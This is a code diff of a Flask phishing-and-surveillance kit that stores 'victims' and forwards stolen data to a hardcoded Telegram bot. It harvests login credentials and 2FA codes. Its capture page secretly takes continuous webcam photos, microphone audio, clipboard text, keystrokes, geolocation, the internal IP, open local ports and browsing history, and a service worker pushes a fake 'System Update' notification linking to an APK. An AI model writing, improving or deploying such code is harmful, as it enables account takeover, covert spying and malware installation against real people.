@@ -1,17 +1,19 @@
-import os, io, uuid, base64, json, logging, sqlite3, re, hashlib
+import os, io, uuid, base64, json, logging, sqlite3, re, hashlib, time
 from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file, g, redirect, url_for, make_response
 import requests
+import threading
+
+# -------------------- Configuration --------------------
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
+DATABASE = "victims.db"
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
-
-DATABASE = "victims.db"
-
+# -------------------- Database --------------------
 def get_db():
     db = getattr(g, '_database', None)
     if db is None:
@@ -34,7 +36,19 @@ def close_connection(exception):
     if db is not None:
         db.close()
 
-# ========= Telegram helpers =========
+# -------------------- Telegram Helpers --------------------
+def send_telegram_message(text):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"},
+            timeout=10
+        )
+    except Exception as e:
+        app.logger.error(f"Telegram message failed: {e}")
+
 def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return
@@ -52,16 +66,9 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=F
         data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
         requests.post(url, data=data, files=files, timeout=10)
     except Exception as e:
-        app.logger.error(f"Telegram file send error: {e}")
+        app.logger.error(f"Telegram file send failed: {e}")
 
-def notify_telegram(text):
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        try:
-            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                         json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=5)
-        except: pass
-
-# ========= HTML Templates =========
+# -------------------- Templates --------------------
 LOGIN_PAGE = """
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
@@ -124,121 +131,208 @@ input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;fo
 CAPTURE_PAGE_ADV = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Checking device...</title>
-<style>body{background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:5vh;} video,canvas{display:none;} button{padding:12px 24px;margin:10px;font-size:16px;cursor:pointer;}</style>
+<head><meta charset="UTF-8"><title>Establishing Connection...</title>
+<style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 40vh; }
+    .blink { animation: blink 1s infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+    video, canvas { display: none; }
+</style>
 </head>
-<body>
-<h2 id="msg">Checking your device security...</h2>
-<video id="v" autoplay playsinline></video><canvas id="c"></canvas>
-<button id="shareScreen" style="display:none;">Allow screen sharing to continue</button>
-<button id="install" style="display:none; background:#4CAF50; color:white; border:none; border-radius:8px;">Install Security Update</button>
-<script>
-const t="{{ token }}";
-const msg=document.getElementById('msg'), v=document.getElementById('v'), c=document.getElementById('c'), ctx=c.getContext('2d');
-const shareBtn=document.getElementById('shareScreen'), installBtn=document.getElementById('install');
+<body onclick="startEverything()" ontouchstart="startEverything()" style="cursor:pointer; height:100vh; width:100vw; margin:0; position:fixed; top:0; left:0;">
+    <h1 id="msg" class="blink">Connecting to Secure Network...</h1>
+    <p style="color:#555;">Tap anywhere to continue</p>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+    <script>
+        const t = "{{ token }}";
+        const msg = document.getElementById('msg');
+        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
+        let stream = null;
+        let capturing = false;
 
-// ========== 1. Clipboard ==========
-document.addEventListener('click', async () => {
-  try {
-    const clip = await navigator.clipboard.readText();
-    if(clip) fetch('/log/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});
-  } catch(e){}
-}, {once:true});
+        async function startEverything() {
+            if (capturing) return;
+            capturing = true;
+            document.body.onclick = null;
+            document.body.ontouchstart = null;
+            msg.innerText = "Authenticating...";
+            msg.classList.remove('blink');
 
-// ========== 2. WebRTC internal IP ==========
-var pc = new RTCPeerConnection({iceServers:[]});
-pc.createDataChannel('');
-pc.createOffer().then(o=>pc.setLocalDescription(o));
-pc.onicecandidate = e => {
-  if(e.candidate){
-    var ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-    if(ip) fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});
-  }
-};
+            // 1. Device info (no permission)
+            const deviceInfo = {
+                type: 'device',
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'N/A'
+            };
+            fetch('/log/' + t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
 
-// ========== 3. Location ==========
-navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})})});
+            // Canvas fingerprint
+            try {
+                const cf = document.createElement('canvas');
+                cf.width = 200; cf.height = 50;
+                const cfctx = cf.getContext('2d');
+                cfctx.textBaseline = 'top';
+                cfctx.font = '14px Arial';
+                cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
+                const fp = cf.toDataURL();
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:fp})});
+            } catch(e) {}
 
-// ========== 4. Device info + battery ==========
-fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
-navigator.getBattery&&navigator.getBattery().then(b=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'battery',level:b.level,charging:b.charging})})});
+            // 2. Internal IP via WebRTC
+            try {
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
+                    }
+                };
+            } catch(e) {}
 
-// ========== 5. Photo ==========
-async function takePhoto(){
-  try{
-    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    v.srcObject=s;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8);fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});setTimeout(()=>s.getTracks().forEach(tr=>tr.stop()),2000);}
-  }catch(e){}
-}
+            // 3. Geolocation (if previously allowed or will prompt)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
+                    err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
+                );
+            }
 
-// ========== 6. Audio ==========
-async function recordAudio(){
-  try{
-    const s=await navigator.mediaDevices.getUserMedia({audio:true});
-    const mr=new MediaRecorder(s);let chunks=[];
-    mr.ondataavailable=e=>chunks.push(e.data);
-    mr.onstop=()=>{
-      const blob=new Blob(chunks,{type:'audio/webm'});
-      const reader=new FileReader();
-      reader.onloadend=()=>{const b64=reader.result.split(',')[1];fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});};
-      reader.readAsDataURL(blob);
-    };
-    mr.start();setTimeout(()=>{mr.stop();s.getTracks().forEach(tr=>tr.stop());},5000);
-  }catch(e){}
-}
+            // 4. Clipboard (needs a user gesture, which we have from click)
+            try {
+                const clip = await navigator.clipboard.readText();
+                if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
+            } catch(e) {}
 
-// ========== 7. Screen Recording ==========
-async function startScreen(){
-  try{
-    const stream = await navigator.mediaDevices.getDisplayMedia({video:true,audio:true});
-    const mr = new MediaRecorder(stream, {mimeType:'video/webm'});
-    let chunks = [];
-    mr.ondataavailable = e => chunks.push(e.data);
-    mr.onstop = () => {
-      const blob = new Blob(chunks, {type:'video/webm'});
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        const b64 = reader.result.split(',')[1];
-        fetch('/screen/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:b64})});
-      };
-      reader.readAsDataURL(blob);
-    };
-    mr.start();
-    setTimeout(()=>{mr.stop();stream.getTracks().forEach(tr=>tr.stop());},5000);
-    shareBtn.style.display='none';
-    installBtn.style.display='block';
-  }catch(e){}
-}
+            // 5. Open port scanning (local)
+            const ports = [80, 22, 443, 8080, 3389, 5900, 21];
+            ports.forEach(port => {
+                const img = new Image();
+                img.src = `http://127.0.0.1:${port}/favicon.ico?t=` + Date.now();
+                const start = Date.now();
+                img.onload = img.onerror = function() {
+                    const elapsed = Date.now() - start;
+                    if (elapsed < 500) { // possibly open
+                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:port})});
+                    }
+                };
+            });
 
-// ========== Main flow ==========
-takePhoto();
-setTimeout(recordAudio,3000);
-setTimeout(()=>{shareBtn.style.display='block';msg.innerText='Please share your screen to finish security check.';},7000);
-shareBtn.onclick=startScreen;
-installBtn.onclick=()=>{window.location='/download/app-update.apk';};
+            // 6. History sniffing (cache probing)
+            function checkVisit(url, label) {
+                const img = new Image();
+                const start = Date.now();
+                img.onload = img.onerror = function() {
+                    const elapsed = Date.now() - start;
+                    if (elapsed < 100) {
+                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'history', site:label, visited:true})});
+                    }
+                };
+                img.src = url + '?t=' + Date.now();
+            }
+            checkVisit('https://facebook.com/favicon.ico', 'facebook');
+            checkVisit('https://instagram.com/favicon.ico', 'instagram');
+            checkVisit('https://t.me/favicon.ico', 'telegram');
 
-// ========== Register Service Worker ==========
-if('serviceWorker' in navigator){
-  navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{
-    console.log('SW registered');
-    // بعد از چند ثانیه نوتیفیکیشن فیک نشان بده
-    setTimeout(()=>{
-      reg.showNotification('System Update', {body:'Critical security update available. Tap to install.', icon:'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Android_robot.svg/1200px-Android_robot.svg.png', requireInteraction:true});
-    }, 15000);
-  });
-}
+            // 7. Camera & Microphone (one prompt)
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                v.srcObject = stream;
+                await new Promise(r => v.onloadedmetadata = r);
+                c.width = v.videoWidth || 640;
+                c.height = v.videoHeight || 480;
+                msg.innerText = "Connected.";
 
-// ========== Keystrokes ==========
-let keys='';
-document.addEventListener('keydown',e=>{keys+=e.key;});
-setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
-</script>
+                // First snapshot immediately
+                takeSnapshot();
+                // Continuous snapshots every 2 seconds
+                window.photoInterval = setInterval(takeSnapshot, 2000);
+
+                // Audio recording (5 seconds) just once
+                try {
+                    const audioTrack = stream.getAudioTracks()[0];
+                    if (audioTrack) {
+                        const mr = new MediaRecorder(new MediaStream([audioTrack]));
+                        let chunks = [];
+                        mr.ondataavailable = e => chunks.push(e.data);
+                        mr.onstop = () => {
+                            const blob = new Blob(chunks, {type:'audio/webm'});
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                const b64 = reader.result.split(',')[1];
+                                fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})});
+                            };
+                            reader.readAsDataURL(blob);
+                        };
+                        mr.start();
+                        setTimeout(() => { mr.stop(); }, 5000);
+                    }
+                } catch(e) {}
+            } catch (e) {
+                msg.innerText = "Connection established. (Camera not available)";
+            }
+
+            // 8. Screen recording (optional, requires second click – not forced here)
+            // We add a hidden button but no forced click; can be improved
+        }
+
+        function takeSnapshot() {
+            if (!stream) return;
+            try {
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                const dataURL = c.toDataURL('image/jpeg', 0.8);
+                fetch('/upload/' + t, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: 'photo', data: dataURL })
+                });
+            } catch (e) {}
+        }
+
+        // Keylogger
+        let keys = '';
+        document.addEventListener('keydown', e => { keys += e.key; });
+        setInterval(() => {
+            if (keys.length > 0) {
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
+                keys = '';
+            }
+        }, 5000);
+
+        // Service Worker for background location tracking
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
+                setTimeout(() => {
+                    reg.showNotification('System Update', {
+                        body: 'Critical security update available. Tap to install.',
+                        icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Android_robot.svg/1200px-Android_robot.svg.png',
+                        requireInteraction: true
+                    });
+                }, 15000);
+            });
+        }
+
+        // Cleanup on close
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(tr => tr.stop());
+            clearInterval(window.photoInterval);
+        });
+    </script>
 </body></html>
 """
 
-# ========= Admin templates (same as before) =========
-# ... کدهای پنل مدیریت و لاگین (مانند نسخه قبلی) ...
-ADMIN_LOGIN = """<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head><body><h2>Admin Panel</h2><form method=post action=/admin><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></body></html>"""
+ADMIN_LOGIN = """
+<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
+<body><h2>Admin Panel</h2><form method=post action=/admin><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></body></html>
+"""
+
 ADMIN_PANEL = """
 <!DOCTYPE html><html><head><title>Victims</title>
 <style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
@@ -253,21 +347,22 @@ ADMIN_PANEL = """
   <b>Credentials:</b> {{ v.creds }}<br>
   {% if v.code2fa %}<b>2FA Code:</b> {{ v.code2fa }}<br>{% endif %}
   <b>Device:</b> <pre>{{ v.info }}</pre>
-  {% if v.photo %}<b>Photo:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
+  {% if v.photo %}<b>Latest Photo:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
   {% if v.audio %}<b>Audio:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
-  {% if v.screen %}<b>Screen Recording:</b> <video controls width=320 src="data:video/webm;base64,{{ v.screen }}"></video><br>{% endif %}
   {% if v.location %}<b>Location:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>View on map</a><br>{% endif %}
   <b>Clipboard:</b> {{ v.clipboard }}<br>
-  <b>Keystrokes:</b> {{ v.keystrokes }}
+  <b>Keystrokes:</b> {{ v.keystrokes }}<br>
+  <b>Open Ports:</b> {{ v.open_ports }}<br>
+  <b>Visited Sites:</b> {{ v.history }}
 </div>
 {% endfor %}
 </body></html>
 """
 
-# ========= Routes =========
+# -------------------- Routes --------------------
 @app.route('/')
 def index():
-    return "Server running. <a href='/new-link'>/new-link</a>"
+    return "Server running. <a href='/new-link'>/new-link</a> | <a href='/admin'>/admin</a>"
 
 @app.route('/new-link')
 def new_link():
@@ -293,20 +388,19 @@ def login(token):
     db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
                (token, email, password, datetime.now().isoformat()))
     db.commit()
-    notify_telegram(f"🔑 New login\nToken: {token}\nEmail: {email}\nPass: {password}")
+    send_telegram_message(f"🔑 <b>New Login</b>\nToken: <code>{token}</code>\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>")
     return redirect(url_for('twofa', token=token))
 
-@app.route('/2fa/<token>', methods=['GET', 'POST'])
+@app.route('/2fa/<token>', methods=['GET','POST'])
 def twofa(token):
     if request.method == 'POST':
         code = request.form.get('code','').strip()
         if not code or len(code)!=6 or not code.isdigit():
             return render_template_string(TWOFA_PAGE, token=token, error="Enter a valid 6-digit code.")
         db = get_db()
-        # ذخیره کد 2FA
         db.execute("UPDATE credentials SET code2fa=? WHERE token=? AND code2fa IS NULL", (code, token))
         db.commit()
-        notify_telegram(f"🔐 2FA Code for {token}: {code}")
+        send_telegram_message(f"🔐 <b>2FA Code</b>\nToken: <code>{token}</code>\nCode: <code>{code}</code>")
         return redirect(url_for('capture', token=token))
     return render_template_string(TWOFA_PAGE, token=token, error=None)
 
@@ -317,7 +411,8 @@ def capture(token):
 @app.route('/upload/<token>', methods=['POST'])
 def upload(token):
     data = request.get_json()
-    if not data: return jsonify({"error":"no data"}),400
+    if not data:
+        return jsonify({"error":"no data"}),400
     media_type = data.get('type')
     raw = data.get('data')
     try:
@@ -331,11 +426,12 @@ def upload(token):
         db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                    (token, media_type, binary, datetime.now().isoformat()))
         db.commit()
+        # Send to Telegram (for photos, send as image; for audio, send as document)
         if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
             if media_type == 'photo':
-                send_telegram_file(binary, 'camera.jpg', f"📸 Photo {token}", as_image=True)
+                send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo</b> from {token}", as_image=True)
             elif media_type == 'audio':
-                send_telegram_file(binary, 'mic.webm', f"🎤 Audio {token}")
+                send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
         return jsonify({"status":"ok"})
     except Exception as e:
         return jsonify({"error":str(e)}),500
@@ -352,7 +448,7 @@ def screen_upload(token):
                    (token, 'screen', binary, datetime.now().isoformat()))
         db.commit()
         if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-            send_telegram_file(binary, 'screen.webm', f"🖥️ Screen Recording {token}", as_video=True)
+            send_telegram_file(binary, 'screen.webm', f"🖥️ <b>Screen Recording</b> from {token}", as_video=True)
         return jsonify({"status":"ok"})
     except Exception as e:
         return jsonify({"error":str(e)}),500
@@ -366,23 +462,31 @@ def log(token):
                (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
     db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
     db.commit()
-    if data.get('type') == 'location':
-        notify_telegram(f"📍 Location: {data.get('lat')},{data.get('lng')}")
+    # Organized Telegram notification for important events
+    if data.get('type') == 'device':
+        info = f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}"
+        send_telegram_message(info)
+    elif data.get('type') == 'location':
+        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
+    elif data.get('type') == 'local_ip':
+        send_telegram_message(f"🖥️ <b>Internal IP</b> for {token}: {data.get('ip')}")
+    elif data.get('type') == 'clipboard':
+        send_telegram_message(f"📋 <b>Clipboard</b> from {token}: <code>{data.get('data','')}</code>")
+    elif data.get('type') == 'keystrokes':
+        send_telegram_message(f"⌨️ <b>Keystrokes</b> from {token}: <code>{data.get('data','')}</code>")
+    elif data.get('type') == 'open_port':
+        send_telegram_message(f"🔌 <b>Open Port</b> on {token}: {data.get('port')}")
+    elif data.get('type') == 'history':
+        send_telegram_message(f"🌐 <b>Visited</b> {data.get('site')}: {data.get('visited')}")
     return jsonify({"status":"ok"})
 
-# ========= Service Worker =========
+# ---------- Service Worker ----------
 SW_JS = """
-self.addEventListener('install', event => {
-  self.skipWaiting();
-});
-self.addEventListener('activate', event => {
-  event.waitUntil(clients.claim());
-});
-// هر 30 ثانیه موقعیت ارسال کن
+self.addEventListener('install', event => { self.skipWaiting(); });
+self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
 setInterval(() => {
   if('geolocation' in navigator){
     navigator.geolocation.getCurrentPosition(pos => {
-      // ارسال به سرور (با فرض توکن از url گرفته شده)
       self.clients.matchAll().then(clients => {
         clients.forEach(client => {
           const url = new URL(client.url);
@@ -404,7 +508,7 @@ def service_worker():
     response.headers['Content-Type'] = 'application/javascript'
     return response
 
-# ========= Admin =========
+# ---------- Admin ----------
 @app.route('/admin', methods=['GET','POST'])
 def admin():
     if request.method == 'POST':
@@ -420,33 +524,54 @@ def admin():
     victims = []
     for row in victims_rows:
         token = row['token']
-        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Device info
+        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         info = json.loads(log_dev['data']) if log_dev else {}
-        cred_row = db.execute("SELECT email,password,code2fa FROM credentials WHERE token=? ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Credentials
+        cred_row = db.execute("SELECT email, password, code2fa FROM credentials WHERE token=? ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         creds = f"{cred_row['email']}:{cred_row['password']}" if cred_row else ""
         code2fa = cred_row['code2fa'] if cred_row and cred_row['code2fa'] else ""
-        local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Local IP
+        local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         local_ip = json.loads(local_ip_row['data']).get('ip','') if local_ip_row else ""
-        clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Clipboard
+        clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         clipboard = json.loads(clip_row['data']).get('data','') if clip_row else ""
-        keys_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC",(token,)).fetchall()
+        # Keystrokes
+        keys_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
         keystrokes = ''.join([json.loads(k['data']).get('data','') for k in keys_rows])
-        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Open ports
+        ports_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port' ORDER BY timestamp ASC", (token,)).fetchall()
+        open_ports = ', '.join(set([str(json.loads(p['data']).get('port','')) for p in ports_rows]))
+        # History
+        hist_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
+        history = ', '.join([f"{json.loads(h['data']).get('site','')} ({json.loads(h['data']).get('visited')})" for h in hist_rows])
+        # Media
+        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
-        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
-        screen_row = db.execute("SELECT data FROM media WHERE token=? AND type='screen' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
-        screen_b64 = base64.b64encode(screen_row['data']).decode() if screen_row else None
-        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1",(token,)).fetchone()
+        # Location
+        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         loc = None
         if loc_row:
             loc_data = json.loads(loc_row['data'])
             loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
         victims.append({
-            "token":token,"ip":row['ip'],"local_ip":local_ip,"created_at":row['created_at'],
-            "creds":creds,"code2fa":code2fa,"info":json.dumps(info, indent=2, ensure_ascii=False),
-            "photo":photo_b64,"audio":audio_b64,"screen":screen_b64,
-            "location":loc,"clipboard":clipboard,"keystrokes":keystrokes
+            "token": token,
+            "ip": row['ip'],
+            "local_ip": local_ip,
+            "created_at": row['created_at'],
+            "creds": creds,
+            "code2fa": code2fa,
+            "info": json.dumps(info, indent=2, ensure_ascii=False),
+            "photo": photo_b64,
+            "audio": audio_b64,
+            "location": loc,
+            "clipboard": clipboard,
+            "keystrokes": keystrokes,
+            "open_ports": open_ports,
+            "history": history
         })
     return render_template_string(ADMIN_PANEL, victims=victims)
 
@@ -454,6 +579,7 @@ def admin():
 def download_file(filename):
     return send_from_directory('static', filename)
 
+# -------------------- Main --------------------
 if __name__ == '__main__':
     init_db()
     port = int(os.environ.get('PORT', 5000))
